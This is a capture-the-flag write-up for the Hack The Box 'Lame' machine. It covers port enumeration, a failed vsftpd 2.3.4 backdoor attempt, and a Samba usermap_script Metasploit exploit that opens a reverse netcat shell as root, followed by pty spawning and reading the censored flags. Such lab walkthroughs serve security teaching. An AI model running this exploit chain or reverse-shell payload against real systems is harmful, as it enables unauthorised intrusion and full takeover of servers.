# CTF: [HTB Lame](https://app.hackthebox.eu/machines/1)

# Enumeration:
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```
We have an interesting output. First we're going to investigate the open FTP service (vsftpd 2.3.4)
# Searchsploit
```
#searchsploit vsftpd 2.3.4
[i] Found (#2): /root/exploitdb/files_exploits.csv
[i] To remove this message, please edit "/root/exploitdb/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /root/exploitdb/files_shellcodes.csv
[i] To remove this message, please edit "/root/exploitdb/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                   | unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
It looks like this vulnerability can be exploited via Metasploit. 
# vsftpd 2.3.4
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki
                                      /Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
The exploit failed. According to the [exploit db](https://www.exploit-db.com/exploits/17491), this backdoor was removed a long time ago, so the exploit could be useless. <br/><br/>
We're going back to enumerating the other ports, at this point we're going to check for samba exploits.
# Samba 
```
└──╼ #searchsploit samba 3.0.20
[i] Found (#2): /root/exploitdb/files_exploits.csv
[i] To remove this message, please edit "/root/exploitdb/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /root/exploitdb/files_shellcodes.csv
[i] To remove this message, please edit "/root/exploitdb/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                   | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                         | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                    | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                    | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                            | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Using searchsploit again, we found a Metasploit module that we can use. 
```
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki
                                      /Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.155    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:56752) at 2021-10-09 23:39:09 -0400

id
uid=0(root) gid=0(root)
```
This time we got a shell! We could setup a tty at this point.
```
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/sh")'
sh-3.2# 
```
This box did not require privilege escalation. Both flags were easy to access.
```
sh-3.2# cat user.txt
cat user.txt
[CENSORED]
sh-3.2# cd ~   
cd ~
sh-3.2# cat root.txt
cat root.txt
[CENSORED]
sh-3.2# 
```
